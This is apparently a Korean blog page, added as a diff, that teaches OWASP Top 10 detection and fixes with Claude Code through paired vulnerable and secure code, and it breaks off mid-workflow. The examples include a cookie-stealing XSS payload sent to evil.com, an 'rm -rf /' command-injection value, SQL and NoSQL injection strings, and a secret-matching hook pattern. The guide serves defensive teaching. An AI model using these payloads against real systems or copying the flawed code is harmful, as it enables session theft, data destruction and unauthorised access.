@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GQHEYDXTHG"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-GQHEYDXTHG');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5138416840385352" crossorigin="anonymous"></script>
+  <meta charset="UTF-8">
+  <link rel="icon" href="../assets/img/logo.svg" type="image/svg+xml">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Claude Code 보안 취약점 자동 분석: OWASP Top 10 스캔 가이드 | Claude Korea</title>
+  <meta name="description" content="Claude Code로 OWASP Top 10 보안 취약점을 자동으로 분석하는 방법. XSS, SQL 인젝션, 인증 결함 등을 코드 레벨에서 탐지하고 수정하세요.">
+  <meta name="keywords" content="Claude Code 보안, OWASP Top 10, 보안 취약점, XSS, SQL 인젝션, 보안 스캔, 코드 보안">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="Claude Korea">
+  <link rel="canonical" href="https://claudekorea.com/blog/claude-code-security-audit.html">
+  <link rel="alternate" hreflang="ko" href="https://claudekorea.com/blog/claude-code-security-audit.html">
+  <link rel="alternate" hreflang="x-default" href="https://claudekorea.com/blog/claude-code-security-audit.html">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="ko_KR">
+  <meta property="og:title" content="Claude Code 보안 취약점 자동 분석: OWASP Top 10 스캔 가이드">
+  <meta property="og:description" content="Claude Code로 OWASP Top 10 보안 취약점을 자동으로 분석하는 방법. XSS, SQL 인젝션, 인증 결함 탐지와 수정.">
+  <meta property="og:image" content="https://claudekorea.com/assets/img/og-image.svg">
+  <meta property="og:url" content="https://claudekorea.com/blog/claude-code-security-audit.html">
+  <meta property="og:site_name" content="Claude Korea">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Claude Code 보안 취약점 자동 분석: OWASP Top 10 스캔 가이드">
+  <meta name="twitter:description" content="OWASP Top 10 취약점을 코드 레벨에서 탐지하고 수정하는 완전 가이드.">
+  <meta name="twitter:image" content="https://claudekorea.com/assets/img/og-image.svg">
+  <script type="application/ld+json">
+  [
+    {"@context":"https://schema.org","@type":"Article","headline":"Claude Code 보안 취약점 자동 분석: OWASP Top 10 스캔 가이드","description":"Claude Code로 OWASP Top 10 보안 취약점을 자동으로 분석하는 방법. XSS, SQL 인젝션, 인증 결함 등을 코드 레벨에서 탐지하고 수정하세요.","image":"https://claudekorea.com/assets/img/og-image.svg","datePublished":"2026-04-13","dateModified":"2026-04-13","inLanguage":"ko-KR","author":{"@type":"Organization","name":"Claude Korea","url":"https://claudekorea.com"},"publisher":{"@type":"Organization","name":"Claude Korea","logo":{"@type":"ImageObject","url":"https://claudekorea.com/assets/img/logo.svg"}},"url":"https://claudekorea.com/blog/claude-code-security-audit.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://claudekorea.com/blog/claude-code-security-audit.html"}},
+    {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"홈","item":"https://claudekorea.com/"},{"@type":"ListItem","position":2,"name":"블로그","item":"https://claudekorea.com/blog.html"},{"@type":"ListItem","position":3,"name":"보안 취약점 분석","item":"https://claudekorea.com/blog/claude-code-security-audit.html"}]}
+  ]
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../assets/css/tokens.css">
+  <link rel="stylesheet" href="../assets/css/base.css">
+  <link rel="stylesheet" href="../assets/css/layout.css">
+  <link rel="stylesheet" href="../assets/css/components.css">
+  <link rel="stylesheet" href="../assets/css/pages.css">
+  <style>
+    .article-hero { padding: 8rem 0 4rem; text-align: center; background: radial-gradient(ellipse 70% 50% at 50% 0%, rgba(124,106,245,0.08) 0%, transparent 70%); }
+    .article-body { max-width: 760px; margin: 0 auto; padding: 3rem 1rem 5rem; }
+    .article-body h2 { font-size: var(--text-xl); font-weight: 700; color: var(--text-primary); margin: 2.5rem 0 1rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.05); }
+    .article-body h3 { font-size: var(--text-lg); font-weight: 700; color: var(--text-primary); margin: 2rem 0 0.75rem; }
+    .article-body p { color: var(--text-secondary); line-height: 1.8; margin-bottom: 1.25rem; }
+    .article-body ul, .article-body ol { color: var(--text-secondary); padding-left: 1.5rem; margin-bottom: 1.25rem; line-height: 1.8; }
+    .article-body li { margin-bottom: 0.5rem; }
+    .article-body li::marker { color: var(--violet); }
+    .article-body code { background: var(--bg-elevated); border: var(--border-glass); border-radius: var(--radius-xs); padding: 0.15rem 0.4rem; font-family: var(--font-mono); font-size: 0.875em; color: var(--cyan); }
+    .article-body pre { background: var(--bg-elevated); border: var(--border-glass); border-radius: var(--radius-md); padding: 1.25rem; margin: 1.5rem 0; overflow-x: auto; }
+    .article-body pre code { background: none; border: none; padding: 0; color: var(--text-primary); font-size: 0.9em; }
+    .article-body blockquote { border-left: 3px solid var(--violet); background: var(--violet-dim); padding: 1rem 1.25rem; border-radius: 0 var(--radius-sm) var(--radius-sm) 0; margin: 1.5rem 0; }
+    .article-body blockquote p { color: var(--text-primary); margin: 0; }
+    .article-body .callout { background: var(--cyan-dim); border: 1px solid rgba(13,240,255,0.18); border-radius: var(--radius-md); padding: 1.25rem; margin: 1.5rem 0; }
+    .article-body .callout p { color: var(--text-primary); margin: 0; }
+    .article-breadcrumb { font-size: var(--text-xs); color: var(--text-muted); margin-bottom: 1.5rem; }
+    .article-breadcrumb a { color: var(--violet-light); }
+    .compare-table { width:100%; border-collapse:collapse; margin: 1.5rem 0; }
+    .compare-table th { background: var(--bg-elevated); color: var(--text-primary); padding: .75rem 1rem; text-align:left; font-size: var(--text-sm); border: 1px solid rgba(255,255,255,0.07); }
+    .compare-table td { padding: .65rem 1rem; color: var(--text-secondary); font-size: var(--text-sm); border: 1px solid rgba(255,255,255,0.05); }
+    .compare-table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+    .tip-box { background: var(--gold-dim); border: 1px solid rgba(245,200,66,0.2); border-radius: var(--radius-md); padding: 1.25rem; margin: 1.5rem 0; }
+    .tip-box p { color: var(--gold-light); margin: 0; font-weight: 500; }
+    .related-links { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:1rem; margin:2rem 0; }
+    .related-link { background:var(--glass-bg); border:var(--border-glass); border-radius:var(--radius-md); padding:1rem; text-align:center; transition:border-color .2s; }
+    .related-link:hover { border-color:var(--violet); }
+    .related-link span { display:block; font-size:1.5rem; margin-bottom:.4rem; }
+    .related-link a { color:var(--text-primary); font-weight:600; font-size:var(--text-sm); }
+    .article-body img { max-width: 100%; height: auto; border-radius: var(--radius-md); border: var(--border-glass); margin: 1.5rem 0; }
+  </style>
+</head>
+<body>
+<nav class="nav" id="main-nav" role="navigation" aria-label="메인 네비게이션">
+  <a href="../index.html" class="nav__logo"><img src="../assets/img/logo.svg" alt="Claude Korea" class="nav__logo-img"></a>
+  <ul class="nav__links">
+    <li><a href="../skills.html">스킬</a></li>
+    <li><a href="../agents.html">에이전트</a></li>
+    <li><a href="../commands.html">명령어</a></li>
+    <li><a href="../mcps.html">MCP</a></li>
+    <li><a href="../blog.html" class="active">블로그</a></li>
+  </ul>
+  <div class="nav__actions"><a href="https://claude.ai" target="_blank" rel="noopener" class="nav__github"><span>Claude 시작</span></a></div>
+  <button class="nav__hamburger" id="nav-hamburger" aria-label="메뉴 열기" aria-expanded="false"><span></span><span></span><span></span></button>
+</nav>
+<nav class="nav__mobile" id="nav-mobile">
+  <a href="../skills.html">스킬</a><a href="../agents.html">에이전트</a><a href="../commands.html">명령어</a><a href="../mcps.html">MCP</a><a href="../blog.html">블로그</a>
+</nav>
+
+<div id="ad-header-banner" class="ad-slot ad-slot--header" aria-label="광고"></div>
+
+<header class="article-hero">
+  <div class="container">
+    <nav class="article-breadcrumb" aria-label="현재 위치">
+      <a href="../index.html">홈</a> › <a href="../blog.html">블로그</a> › 보안 취약점 분석
+    </nav>
+    <h1 style="font-size:var(--text-3xl);font-weight:700;margin-bottom:1rem;line-height:1.2;">Claude Code 보안 취약점 자동 분석: OWASP Top 10 스캔 가이드</h1>
+    <p style="color:var(--text-secondary);max-width:620px;margin:0 auto 1.5rem;">XSS, SQL 인젝션, 인증 결함 등 OWASP Top 10 보안 취약점을 Claude Code로 자동 탐지하고 수정하는 완전 가이드입니다.</p>
+    <div style="display:flex;align-items:center;justify-content:center;gap:1rem;font-size:var(--text-xs);color:var(--text-muted);">
+      <span>Claude Korea</span><span>·</span><span>2026년 4월</span><span>·</span><span>14분 읽기</span><span>·</span><span class="badge badge--purple">심화</span>
+    </div>
+  </div>
+</header>
+
+<article class="article-body" itemscope itemtype="https://schema.org/Article">
+
+  <h2>왜 코드 보안이 중요한가?</h2>
+
+  <p>2025년 기준으로 전 세계 사이버 공격 피해 규모는 연간 10조 달러를 넘어섰습니다. 이 중 상당수가 소프트웨어 취약점을 통한 공격입니다. 보안 사고는 기업에 금전적 손실뿐 아니라 고객 신뢰 하락, 법적 책임, 브랜드 이미지 손상 등 복합적인 피해를 초래합니다.</p>
+
+  <p>특히 웹 애플리케이션은 공격의 주요 대상입니다. OWASP(Open Web Application Security Project)에 따르면, 웹 애플리케이션의 94%에서 어떤 형태든 보안 취약점이 발견됩니다. 문제는 대부분의 취약점이 코드 작성 단계에서 발생한다는 것입니다. 즉, 개발자가 보안을 의식하며 코드를 작성하면 대부분의 취약점을 예방할 수 있습니다.</p>
+
+  <p>하지만 현실적으로 모든 개발자가 보안 전문가가 되기는 어렵습니다. 여기서 Claude Code가 강력한 도우미 역할을 합니다. Claude Code는 코드를 분석하여 보안 취약점을 자동으로 탐지하고, 수정 방법까지 제시합니다. OWASP Top 10에 해당하는 주요 취약점을 코드 레벨에서 식별할 수 있으며, 취약한 코드와 안전한 코드를 비교해서 보여줍니다.</p>
+
+  <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=760&q=80" alt="사이버 보안 분석 대시보드가 표시된 모니터 화면" loading="lazy">
+
+  <div class="callout">
+    <p>이 가이드는 OWASP Top 10 (2021 버전)을 기반으로 합니다. Claude Code의 보안 스캔 기능은 정적 분석(SAST) 수준의 탐지를 제공하며, 전문 보안 감사를 완전히 대체하지는 않습니다. 중요한 프로덕션 시스템에는 전문 보안 도구와 함께 사용하는 것을 권장합니다.</p>
+  </div>
+
+  <h2>OWASP Top 10 개요: 개발자가 알아야 할 핵심</h2>
+
+  <p>OWASP Top 10은 웹 애플리케이션에서 가장 빈번하게 발견되는 10가지 보안 위험을 정리한 목록입니다. 개발자라면 최소한 이 10가지를 이해하고 방어 코드를 작성할 수 있어야 합니다.</p>
+
+  <table class="compare-table">
+    <thead>
+      <tr>
+        <th>순위</th>
+        <th>취약점</th>
+        <th>위험도</th>
+        <th>발생 빈도</th>
+        <th>Claude Code 탐지</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>A01</td>
+        <td>접근 제어 결함 (Broken Access Control)</td>
+        <td>치명적</td>
+        <td>매우 높음</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A02</td>
+        <td>암호화 실패 (Cryptographic Failures)</td>
+        <td>높음</td>
+        <td>높음</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A03</td>
+        <td>인젝션 (Injection)</td>
+        <td>치명적</td>
+        <td>높음</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A04</td>
+        <td>불안전한 설계 (Insecure Design)</td>
+        <td>높음</td>
+        <td>보통</td>
+        <td>부분 탐지</td>
+      </tr>
+      <tr>
+        <td>A05</td>
+        <td>보안 설정 오류 (Security Misconfiguration)</td>
+        <td>보통</td>
+        <td>매우 높음</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A06</td>
+        <td>취약한 컴포넌트 (Vulnerable Components)</td>
+        <td>높음</td>
+        <td>높음</td>
+        <td>부분 탐지</td>
+      </tr>
+      <tr>
+        <td>A07</td>
+        <td>인증 결함 (Authentication Failures)</td>
+        <td>치명적</td>
+        <td>보통</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A08</td>
+        <td>데이터 무결성 실패 (Data Integrity Failures)</td>
+        <td>높음</td>
+        <td>보통</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A09</td>
+        <td>로깅 및 모니터링 실패 (Logging Failures)</td>
+        <td>보통</td>
+        <td>높음</td>
+        <td>탐지 가능</td>
+      </tr>
+      <tr>
+        <td>A10</td>
+        <td>SSRF (Server-Side Request Forgery)</td>
+        <td>높음</td>
+        <td>보통</td>
+        <td>탐지 가능</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Claude Code 보안 스캔 시작하기</h2>
+
+  <p>Claude Code에서 보안 스캔을 실행하는 가장 기본적인 방법부터 알아보겠습니다.</p>
+
+  <h3>기본 보안 스캔 실행</h3>
+
+  <pre><code># 프로젝트 전체 보안 스캔
+> /security
+
+# 특정 파일 보안 스캔
+> /security src/controllers/auth.controller.ts
+
+# 특정 디렉토리 보안 스캔
+> /security src/api/
+
+# OWASP Top 10 기준으로 스캔
+> 이 프로젝트의 코드를 OWASP Top 10 기준으로 보안 감사해줘.
+> 각 취약점 유형별로 발견된 문제를 정리하고, 수정 방법을 제시해줘.</code></pre>
+
+  <p>Claude Code는 코드를 분석하여 다음과 같은 형식으로 보안 보고서를 생성합니다.</p>
+
+  <pre><code># 보안 스캔 결과 보고서
+
+## 치명적 (Critical) - 즉시 수정 필요
+1. SQL 인젝션 - src/api/users.ts:45
+2. 하드코딩된 비밀키 - src/config/auth.ts:12
+
+## 높음 (High) - 빠른 수정 권장
+3. XSS 취약점 - src/components/Comment.tsx:28
+4. CSRF 토큰 누락 - src/middleware/csrf.ts
+
+## 보통 (Medium) - 계획적 수정
+5. 불필요한 에러 정보 노출 - src/api/error-handler.ts:15
+6. 취약한 해시 알고리즘 사용 - src/utils/hash.ts:8
+
+## 낮음 (Low) - 개선 권장
+7. 보안 헤더 미설정 - src/server.ts:20</code></pre>
+
+  <h2>A03: 인젝션 공격 탐지와 방어</h2>
+
+  <p>인젝션 공격은 가장 오래되었지만 여전히 가장 위험한 취약점 중 하나입니다. 사용자 입력이 쿼리, 명령어, 코드에 직접 삽입되어 의도하지 않은 동작을 유발합니다.</p>
+
+  <h3>SQL 인젝션: 취약한 코드 vs 안전한 코드</h3>
+
+  <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=760&q=80" alt="데이터베이스 보안을 상징하는 매트릭스 코드 화면" loading="lazy">
+
+  <pre><code>// 취약한 코드 - SQL 인젝션 가능
+app.get('/api/users', async (req, res) => {
+  const { name } = req.query;
+  // 사용자 입력을 직접 쿼리에 삽입 (위험!)
+  const query = `SELECT * FROM users WHERE name = '${name}'`;
+  const result = await db.query(query);
+  res.json(result.rows);
+});
+
+// 공격 예시: ?name=' OR '1'='1' --
+// 실행되는 쿼리: SELECT * FROM users WHERE name = '' OR '1'='1' --'
+// 결과: 모든 사용자 정보가 유출됨</code></pre>
+
+  <pre><code>// 안전한 코드 - 파라미터화된 쿼리 사용
+app.get('/api/users', async (req, res) => {
+  const { name } = req.query;
+
+  // 입력값 검증
+  if (typeof name !== 'string' || name.length > 100) {
+    return res.status(400).json({ error: '유효하지 않은 이름입니다' });
+  }
+
+  // 파라미터화된 쿼리 (안전)
+  const query = 'SELECT * FROM users WHERE name = $1';
+  const result = await db.query(query, [name]);
+  res.json(result.rows);
+});</code></pre>
+
+  <h3>NoSQL 인젝션 방어</h3>
+
+  <pre><code>// 취약한 코드 - MongoDB NoSQL 인젝션
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+  // 사용자 입력을 직접 쿼리 조건으로 사용 (위험!)
+  const user = await User.findOne({ username, password });
+  // 공격: { "username": {"$gt": ""}, "password": {"$gt": ""} }
+  // 결과: 첫 번째 사용자로 로그인됨
+});
+
+// 안전한 코드 - 입력 타입 검증 + 해시 비교
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+
+  // 타입 검증: 반드시 문자열인지 확인
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    return res.status(400).json({ error: '유효하지 않은 입력입니다' });
+  }
+
+  // 사용자 조회 (비밀번호는 쿼리에 포함하지 않음)
+  const user = await User.findOne({ username: String(username) });
+  if (!user) {
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  // 비밀번호는 별도로 해시 비교
+  const isValid = await bcrypt.compare(password, user.passwordHash);
+  if (!isValid) {
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  const token = generateJWT(user);
+  res.json({ token });
+});</code></pre>
+
+  <h3>커맨드 인젝션 방어</h3>
+
+  <pre><code># 취약한 코드 - Python 커맨드 인젝션
+import os
+
+def ping_host(hostname):
+    # 사용자 입력을 직접 시스템 명령에 삽입 (위험!)
+    os.system(f"ping -c 4 {hostname}")
+    # 공격: hostname = "google.com; rm -rf /"
+
+# 안전한 코드 - subprocess + 입력 검증
+import subprocess
+import re
+
+def ping_host(hostname: str) -> str:
+    # 입력값 검증: 호스트명 패턴만 허용
+    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
+        raise ValueError("유효하지 않은 호스트명입니다")
+
+    # subprocess.run으로 shell=False 사용 (안전)
+    result = subprocess.run(
+        ['ping', '-c', '4', hostname],
+        capture_output=True,
+        text=True,
+        timeout=30
+    )
+    return result.stdout</code></pre>
+
+  <h2>A01: 접근 제어 결함 탐지</h2>
+
+  <p>접근 제어 결함은 OWASP Top 10에서 가장 높은 순위를 차지하는 취약점입니다. 인증된 사용자가 권한 없는 리소스에 접근하거나, 다른 사용자의 데이터를 조회/수정할 수 있는 경우 발생합니다.</p>
+
+  <h3>IDOR(Insecure Direct Object Reference) 취약점</h3>
+
+  <pre><code>// 취약한 코드 - IDOR: 다른 사용자의 주문을 볼 수 있음
+app.get('/api/orders/:orderId', authenticate, async (req, res) => {
+  const order = await Order.findById(req.params.orderId);
+  // 문제: 주문이 현재 로그인한 사용자의 것인지 확인하지 않음
+  res.json(order);
+});
+
+// 안전한 코드 - 소유자 검증 추가
+app.get('/api/orders/:orderId', authenticate, async (req, res) => {
+  const order = await Order.findById(req.params.orderId);
+
+  if (!order) {
+    return res.status(404).json({ error: '주문을 찾을 수 없습니다' });
+  }
+
+  // 현재 사용자의 주문인지 확인
+  if (order.userId.toString() !== req.user.id) {
+    return res.status(403).json({ error: '접근 권한이 없습니다' });
+  }
+
+  res.json(order);
+});</code></pre>
+
+  <h3>수평적 권한 상승 방어</h3>
+
+  <pre><code>// 취약한 코드 - 관리자 API에 권한 검사 누락
+app.delete('/api/admin/users/:userId', authenticate, async (req, res) => {
+  // 문제: 관리자인지 확인하지 않음!
+  await User.findByIdAndDelete(req.params.userId);
+  res.json({ message: '사용자가 삭제되었습니다' });
+});
+
+// 안전한 코드 - 역할 기반 접근 제어(RBAC) 적용
+const requireRole = (...roles) => {
+  return (req, res, next) => {
+    if (!req.user || !roles.includes(req.user.role)) {
+      return res.status(403).json({
+        error: '이 작업을 수행할 권한이 없습니다'
+      });
+    }
+    next();
+  };
+};
+
+app.delete('/api/admin/users/:userId',
+  authenticate,
+  requireRole('admin', 'superadmin'),
+  async (req, res) => {
+    // 자기 자신은 삭제 불가
+    if (req.params.userId === req.user.id) {
+      return res.status(400).json({
+        error: '자신의 계정은 삭제할 수 없습니다'
+      });
+    }
+
+    await User.findByIdAndDelete(req.params.userId);
+
+    // 감사 로그 기록
+    await AuditLog.create({
+      action: 'USER_DELETED',
+      performedBy: req.user.id,
+      targetUser: req.params.userId,
+      timestamp: new Date(),
+      ip: req.ip
+    });
+
+    res.json({ message: '사용자가 삭제되었습니다' });
+  }
+);</code></pre>
+
+  <h2>A07: XSS(Cross-Site Scripting) 탐지와 방어</h2>
+
+  <p>XSS 공격은 악성 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행되게 합니다. 세션 탈취, 키로깅, 피싱 등 다양한 공격에 활용됩니다.</p>
+
+  <h3>Stored XSS 방어</h3>
+
+  <pre><code>// 취약한 코드 - React에서 dangerouslySetInnerHTML 사용
+function Comment({ comment }) {
+  // 사용자 입력을 HTML로 직접 렌더링 (위험!)
+  return (
+    &lt;div dangerouslySetInnerHTML={{ __html: comment.body }} /&gt;
+  );
+  // 공격: comment.body = '&lt;script&gt;document.location="https://evil.com/steal?cookie="+document.cookie&lt;/script&gt;'
+}
+
+// 안전한 코드 - 텍스트로 렌더링 또는 sanitize 적용
+import DOMPurify from 'dompurify';
+
+function Comment({ comment }) {
+  // 방법 1: 텍스트로 렌더링 (가장 안전)
+  return &lt;div&gt;{comment.body}&lt;/div&gt;;
+
+  // 방법 2: HTML이 필요한 경우 DOMPurify로 살균
+  const sanitized = DOMPurify.sanitize(comment.body, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+    ALLOWED_ATTR: ['href'],
+  });
+  return &lt;div dangerouslySetInnerHTML={{ __html: sanitized }} /&gt;;
+}</code></pre>
+
+  <h3>서버 측 XSS 방어</h3>
+
+  <pre><code># 취약한 코드 - Python Flask에서 사용자 입력 직접 반환
+from flask import Flask, request
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    # 사용자 입력을 HTML에 직접 삽입 (위험!)
+    return f'&lt;h1&gt;검색 결과: {query}&lt;/h1&gt;'
+    # 공격: ?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# 안전한 코드 - 이스케이프 처리 + CSP 헤더
+from flask import Flask, request, render_template
+from markupsafe import escape
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    # markupsafe로 HTML 이스케이프 처리
+    safe_query = escape(query)
+    return render_template('search.html', query=safe_query)
+
+# 추가: Content Security Policy 헤더 설정
+@app.after_request
+def add_security_headers(response):
+    response.headers['Content-Security-Policy'] = (
+        "default-src 'self'; "
+        "script-src 'self'; "
+        "style-src 'self' 'unsafe-inline'; "
+        "img-src 'self' data: https:; "
+    )
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    return response</code></pre>
+
+  <h2>A02: 암호화 실패 탐지</h2>
+
+  <p>민감한 데이터의 암호화가 부실하거나 누락된 경우 발생합니다. 비밀번호 저장, 데이터 전송, API 키 관리 등에서 자주 발견됩니다.</p>
+
+  <pre><code>// 취약한 코드 모음 - 암호화 실패 패턴들
+
+// 1. 평문 비밀번호 저장 (위험!)
+const user = await User.create({
+  email: req.body.email,
+  password: req.body.password  // 해시 없이 저장
+});
+
+// 2. MD5/SHA1 해시 사용 (약한 알고리즘)
+const crypto = require('crypto');
+const hash = crypto.createHash('md5').update(password).digest('hex');
+
+// 3. 하드코딩된 비밀키 (위험!)
+const JWT_SECRET = 'my-super-secret-key-123';
+const API_KEY = 'sk-1234567890abcdef';
+
+// 4. HTTP로 민감한 데이터 전송 (암호화 안 됨)
+fetch('http://api.example.com/payment', {
+  method: 'POST',
+  body: JSON.stringify({ cardNumber: '4111111111111111' })
+});</code></pre>
+
+  <pre><code>// 안전한 코드 - 올바른 암호화 적용
+
+// 1. bcrypt로 비밀번호 해시
+const bcrypt = require('bcrypt');
+const SALT_ROUNDS = 12;
+
+const hashedPassword = await bcrypt.hash(req.body.password, SALT_ROUNDS);
+const user = await User.create({
+  email: req.body.email,
+  password: hashedPassword
+});
+
+// 2. 비밀번호 검증
+const isValid = await bcrypt.compare(inputPassword, user.password);
+
+// 3. 환경변수로 비밀키 관리
+const JWT_SECRET = process.env.JWT_SECRET;
+if (!JWT_SECRET || JWT_SECRET.length < 32) {
+  throw new Error('JWT_SECRET must be at least 32 characters');
+}
+
+// 4. AES-256-GCM으로 민감 데이터 암호화
+const crypto = require('crypto');
+
+function encrypt(text, key) {
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  const authTag = cipher.getAuthTag().toString('hex');
+  return { encrypted, iv: iv.toString('hex'), authTag };
+}
+
+function decrypt(encryptedData, key) {
+  const decipher = crypto.createDecipheriv(
+    'aes-256-gcm',
+    key,
+    Buffer.from(encryptedData.iv, 'hex')
+  );
+  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
+  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+  return decrypted;
+}</code></pre>
+
+  <h2>보안 스캔 에이전트 설정</h2>
+
+  <p>Claude Code의 <a href="../agents.html">에이전트 기능</a>을 활용하면 보안 스캔을 자동화하고 체계적으로 수행할 수 있습니다. 다음은 보안 감사 전용 에이전트 설정 예시입니다.</p>
+
+  <pre><code># .claude/agents/security-auditor.md
+---
+name: "security-auditor"
+description: "OWASP Top 10 기준 보안 감사를 수행합니다"
+triggers:
+  - "보안 스캔"
+  - "보안 감사"
+  - "security audit"
+  - "취약점 분석"
+version: "1.0.0"
+---
+
+# 보안 감사 에이전트
+
+## 스캔 순서
+
+### 1단계: 인젝션 취약점 스캔
+- SQL 인젝션 (문자열 보간 쿼리, raw query)
+- NoSQL 인젝션 (MongoDB 연산자 필터링)
+- 커맨드 인젝션 (os.system, exec, child_process)
+- LDAP 인젝션, XML 인젝션
+
+### 2단계: 인증/인가 결함 스캔
+- 하드코딩된 자격 증명 (비밀번호, API 키, 토큰)
+- 취약한 JWT 설정 (algorithm: none, 짧은 만료시간 미설정)
+- 비밀번호 정책 미적용 (최소 길이, 복잡성)
+- IDOR 취약점 (사용자 ID 기반 직접 접근)
+
+### 3단계: XSS/CSRF 스캔
+- dangerouslySetInnerHTML 사용
+- innerHTML 직접 할당
+- URL 파라미터의 비이스케이프 출력
+- CSRF 토큰 미적용
+
+### 4단계: 암호화 검사
+- 평문 비밀번호 저장
+- 약한 해시 알고리즘 (MD5, SHA1)
+- HTTP 사용 (HTTPS 미적용)
+- 약한 난수 생성기 (Math.random)
+
+### 5단계: 설정 오류 검사
+- 디버그 모드 프로덕션 노출
+- 상세 에러 메시지 클라이언트 노출
+- 불필요한 포트/엔드포인트 오픈
+- 보안 헤더 미설정
+
+## 보고 형식
+각 발견 사항을 다음 형식으로 보고:
+- 심각도: Critical / High / Medium / Low
+- 위치: 파일명:라인번호
+- 설명: 취약점 설명
+- 공격 시나리오: 어떻게 악용될 수 있는지
+- 수정 방법: 구체적인 코드 수정 제안</code></pre>
+
+  <h2>자동 보안 훅(Hook) 설정</h2>
+
+  <p>코드를 커밋하기 전에 자동으로 보안 검사를 수행하도록 <a href="hooks-guide.html">훅(Hook)</a>을 설정할 수 있습니다. 이렇게 하면 보안 취약점이 있는 코드가 저장소에 푸시되는 것을 사전에 방지할 수 있습니다.</p>
+
+  <pre><code>// .claude/settings.json
+{
+  "hooks": {
+    "pre-commit": [
+      {
+        "name": "security-check",
+        "command": "claude /security --staged-files --severity critical,high",
+        "description": "커밋 전 보안 취약점 스캔",
+        "failOnError": true
+      }
+    ],
+    "pre-push": [
+      {
+        "name": "full-security-audit",
+        "command": "claude /security --changed-since origin/main",
+        "description": "푸시 전 전체 보안 감사",
+        "failOnError": true
+      }
+    ]
+  }
+}</code></pre>
+
+  <h3>Git pre-commit 훅으로 비밀키 유출 방지</h3>
+
+  <pre><code>#!/bin/bash
+# .git/hooks/pre-commit
+
+echo "보안 스캔 실행 중..."
+
+# 1. 하드코딩된 비밀키 검사
+SECRETS_PATTERN='(password|secret|api_key|apikey|token|private_key)\s*[:=]\s*["\x27][^"\x27]{8,}'
+
+if git diff --cached --diff-filter=d | grep -iP "$SECRETS_PATTERN"; then
+  echo "경고: 하드코딩된 비밀키가 발견되었습니다!"
+  echo "환경변수를 사용하세요."
+  exit 1
+fi
+
+# 2. .env 파일 커밋 방지
+if git diff --cached --name-only | grep -E '\.env($|\.)'; then
+  echo "경고: .env 파일은 커밋할 수 없습니다!"
+  exit 1
+fi
+
+# 3. 개인키 파일 커밋 방지
+if git diff --cached --name-only | grep -E '\.(pem|key|p12|pfx)$'; then
+  echo "경고: 개인키 파일은 커밋할 수 없습니다!"
+  exit 1
+fi
+
+echo "보안 스캔 통과!"
+exit 0</code></pre>
+
+  <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=760&q=80" alt="사이버 보안 자물쇠와 디지털 보호 개념 이미지" loading="lazy">
+
+  <h2>CI/CD 보안 파이프라인 구축</h2>
+
+  <p>개발 워크플로우에 보안 검사를 자동으로 통합하면 취약점이 프로덕션에 도달하기 전에 발견할 수 있습니다. <a href="automation-guide.html">자동화 가이드</a>에서 더 자세한 CI/CD 설정 방법을 확인할 수 있습니다.</p>
+
+  <pre><code># .github/workflows/security.yml
+name: Security Scan
+on:
+  push:
+    branches: [main, develop]
+  pull_request:
+    branches: [main]
+
+jobs:
+  security-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: SAST 정적 분석
+        run: |
+          npm install -g @claude/cli
+          claude /security --format sarif --output security-report.sarif
+
+      - name: 의존성 취약점 스캔
+        run: |
+          npm audit --audit-level=high
+          # Python의 경우
+          # pip-audit --strict
+
+      - name: 비밀키 유출 스캔
+        uses: trufflesecurity/trufflehog@main
+        with:
+          extra_args: --only-verified
+
